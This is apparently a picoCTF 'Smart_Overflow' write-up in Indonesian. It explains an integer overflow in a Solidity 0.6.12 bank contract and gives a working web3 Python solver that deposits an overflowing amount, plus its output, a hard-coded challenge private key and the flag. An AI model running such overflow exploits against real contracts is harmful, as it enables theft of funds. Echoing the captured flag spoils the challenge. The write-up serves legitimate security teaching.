# Smart_Overflow #
 
## Overview ##
Author: OB

Category: [Blockchain](../)

## Description ##

Welcome!
The contract tracks balances using uint256 math. It should be impossible to get the flag... Contract: [here](https://challenge-files.picoctf.net/c_mysterious_sea/7bb36d4f0d3e6babe4a2f906d04044ff5a6cf1bc1ab59c041865e63610ed6b7a/IntOverflowBank.sol)
The eth chain is at:
Eth node address: mysterious-sea.picoctf.net:53401
More details can be found at [here](http://mysterious-sea.picoctf.net:56014/).
NOTE: this server can take up to 5 minutes to start up. Please be patient.

## Approach ##

diberikan IntOverflowBank.sol yang berisi

```
pragma solidity ^0.6.12;

contract IntOverflowBank {
    mapping(address => uint256) public balances;
    address public owner;
    string private flag;
    bool public revealed;

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);
    event FlagRevealed(string flag);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor() public {
        owner = msg.sender;
        revealed = false;
    }

    function setFlag(string memory _flag) external onlyOwner {
        flag = _flag;
    }

    function deposit(uint256 amount) external {
        uint256 oldBalance = balances[msg.sender];
        balances[msg.sender] = balances[msg.sender] + amount;

        emit Deposit(msg.sender, amount);
        if (!revealed && balances[msg.sender] < amount) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender] - amount;
        emit Withdraw(msg.sender, amount);
    }

    function getFlag() external view returns (string memory) {
        require(revealed, "Flag not revealed yet");
        return flag;
    }
}
```

Pada versi solidity versi 0.6.12 ini belum memiliki proteksi overflow otomatis. sehingga jika dilihat pada kode lebih tepatnya fungsi deposit 

```
function deposit(uint256 amount) external {
        uint256 oldBalance = balances[msg.sender];
        balances[msg.sender] = balances[msg.sender] + amount; // Baris krusial

        emit Deposit(msg.sender, amount);
        if (!revealed && balances[msg.sender] < amount) { // logika untuk memicu flagnya
            revealed = true;
            emit FlagRevealed(flag);
        }
    }
```

Kerentanan terjadi pada balances[msg.sender] + amount. Karena variabel bertipe uint256, nilai maksimum yang dapat ditampung adalah 2^256 - 1. Jika kita menambahkan angka sedemikian sehingga hasil penjumlahannya melebihi nilai tersebut, akan terjadi oveflow dan nilainya akan kembali ke angka yang sangat kecil.

Tujuannya dalah membuat balances[msg.sender] < amount bernilai true. sehingga untuk mengeksploitnya menggunakan python dengan library web3 seperti solver berikut

```
from web3 import Web3

rpc_url = "http://mysterious-sea.picoctf.net:59295"
contract_address = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
private_key = "0x5990268c3d92cabbac6c3097e17eecf36895ad7f19367acb74988d8799c3d08f"
my_address = "0x3043412EfA52B7fC4d7A804AB24dD22d2e9c8cd2"

abi = [
    {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}
]

w3 = Web3(Web3.HTTPProvider(rpc_url))
contract = w3.eth.contract(address=contract_address, abi=abi)

current_balance = contract.functions.balances(my_address).call()
overflow_amount = (2**256) - current_balance

print(f"Saldo saat ini: {current_balance}")
print(f"Deposit yang akan dikirim untuk memicu overflow: {overflow_amount}")

def run_exploit():
    nonce = w3.eth.get_transaction_count(my_address)

    # Membangun transaksi deposit
    tx = contract.functions.deposit(overflow_amount).build_transaction({
        'from': my_address,
        'nonce': nonce,
        'gas': 200000,
        'gasPrice': w3.eth.gas_price,
    })

    # Menandatangani dan mengirim transaksi
    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Transaksi terkirim: {tx_hash.hex()}")

    # Menunggu konfirmasi
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Deposit overflow berhasil!")

    # Mengambil flag
    flag = contract.functions.getFlag().call()
    print(f"Flag berhasil didapatkan: {flag}")

if __name__ == "__main__":
    run_exploit()
```

Sehingga ketika dijalankan akan menghasilkan 

Saldo saat ini: 115792089237316195423570985008687907853269984665640564039457584007913129639935
Deposit yang akan dikirim untuk memicu overflow: 1
Transaksi terkirim: b7b21226f35717ee89c01b44bc139cf17c2c3f6cc34aaa097ec08fc5ffb7840a
Deposit overflow berhasil!
Flag berhasil didapatkan: picoCTF{Sm4r7_OverFL0ws_ExI5t_a14a9783}

### Flag: `picoCTF{Sm4r7_OverFL0ws_ExI5t_a14a9783}`